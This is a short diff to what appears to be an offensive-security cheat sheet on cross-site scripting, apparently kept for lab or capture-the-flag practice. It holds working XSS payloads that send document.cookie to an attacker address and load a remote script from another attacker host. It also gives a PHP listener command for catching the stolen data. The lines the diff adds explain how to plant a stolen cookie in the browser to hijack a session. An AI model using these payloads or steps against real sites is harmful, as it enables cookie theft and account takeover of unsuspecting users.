@@ -108,7 +108,7 @@ append()
 ```javascript
 <img src=1 onerror=\"document.location='http://10.10.16.47:8000/'+document.cookie\">
 ```
-## Blind XSS
+## Blind XSS -to> Session Hijacking
 1) `mkdir /tmp/tmpserver && cd /tmp/tmpserver && sudo php -S 0.0.0.0:PORT`
 2) Find Vulnerable Parameter (Burp Intruder with URL Payload Processing to encode if needed)
 *Examples of Blind XSS Payloads - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss*
@@ -160,6 +160,8 @@ if (isset($_GET['c'])) {
 ```javascript
 field3="><script+src%3dhttp%3a//10.10.14.82%3a8767/script.js></script>
 ```
+
+6) With the cookie, add it in Storage in browser on `login.php` and refresh for session hijacking 
 
 
 ## Defacing/Credential Stealing with XSS
